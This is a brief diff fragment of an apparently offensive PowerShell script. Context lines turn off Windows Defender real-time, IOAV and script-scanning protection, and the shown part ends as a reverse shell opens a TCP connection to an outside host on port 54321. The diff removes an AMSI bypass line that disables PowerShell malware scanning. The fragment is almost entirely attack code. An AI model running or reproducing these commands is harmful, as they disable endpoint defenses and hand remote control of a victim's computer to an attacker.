@@ -3,9 +3,6 @@ Set-MpPreference -DisableRealtimeMonitoring 1
 Set-MpPreference -DisableIOAVProtection 1
 Set-MpPreference -DisableScriptScanning 1
 
-# AMSI Bypass
-[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
-
 # Reverse Shell
 $c=New-Object System.Net.Sockets.TCPClient('desktop-pqf78il.tail7f62d3.ts.net',54321)
 $s=$c.GetStream()
